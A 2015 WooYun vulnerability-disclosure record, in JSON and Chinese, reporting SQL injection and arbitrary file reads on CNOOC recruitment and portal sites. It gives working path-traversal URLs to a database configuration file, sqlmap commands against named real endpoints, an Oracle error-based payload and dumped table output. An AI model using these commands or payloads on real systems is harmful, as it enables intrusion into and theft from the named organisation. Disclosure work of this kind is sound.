{"id": 32292, "wybug_id": "wooyun-2015-0117834", "wybug_title": "中国海洋石油某站多个漏洞打包(SQL注入&amp;文件读取等)", "wybug_corp": "中国海洋石油总公司", "wybug_author": "路人甲", "wybug_date": "2015-06-03 09:26", "wybug_open_date": "2015-06-08 09:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中海油多处sql注射及任意文件读取 详细说明：  1.zhaopin.cnooc.com.cn 用友nc任意文件读取： \nhttp://zhaopin.cnooc.com.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml\n \nhttp://zhaopin.cnooc.com.cn:90/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml\n内网数据库配置泄露 sql注入： \nsqlmap.py -u \"http://zhaopin.cnooc.com.cn/hrss/attach.download.d?appName=PSNBASDOC_RM&pkAttach=null\" -p pkAttach --random-agent\n \nsqlmap.py -u \"http://zhaopin.cnooc.com.cn/hrss/ref.show.d?refcode=HI000000000000000003\" -p refcode--random-agent\n 另外，该网站还有许多其他的用友系统的通用注入，太多了就不贴了。 2.ee.cnooc.com.cn(ps:早上还不需要注册，但是下午一看就需要注册了，应该只有登录后才能注入，又只允许内部人员注册，所以可以忽略吧，没想到居然这么有意识，下次下手得快) \nsqlmap.py -u \"http://ee.cnooc.com.cn/portal.php?catid=128&mod=list\" -p catid --random-agent\n 附图： \n\n   漏洞证明：  \n\n\n\n\n--Parameter: pkAttach (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: appName=PSNBASDOC_RM&pkAttach=null' AND 8166=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(122)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (8166=8166) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'YYvM'='YYvM---web application technology: JSPback-end DBMS: OracleDatabase: SYS[334 tables]+-----------------------------------------------+| %255FDEFAULT%255FAUDITING%255FOPTIONS%255F    || APPLY$%255FCHANGE%255FHANDLERS                || APPLY$%255FCONF%255FHDLR%255FCOLUMNS          || APPLY$%255FCONSTRAINT%255FCOLUMNS             || APPLY$%255FDEST%255FOBJ                       || APPLY$%255FDEST%255FOBJ%255FCMAP              || APPLY$%255FDEST%255FOBJ%255FOPS               || APPLY$%255FERROR                              || APPLY$%255FERROR%255FHANDLER                  || APPLY$%255FERROR%255FTXN                      || APPLY$%255FSOURCE%255FOBJ                     || APPLY$%255FSOURCE%255FSCHEMA                  || APPLY$%255FVIRTUAL%255FOBJ%255FCONS           || AUX%255FSTATS$                                || AW%255FOBJ$                                   || AW%255FPRG$                                   || AW%255FPROP$                                  || AW%255FTRACK$                                 || CACHE%255FSTATS%255F0$                        || CACHE%255FSTATS%255F1$                        || CDC%255FCHANGE%255FCOLUMNS$                   || CDC%255FCHANGE%255FSETS$                      || CDC%255FCHANGE%255FSOURCES$                   |\n   修复方案：  zhaopin还是找用友吧，ee分站也要过滤一下   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-08 09:28 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}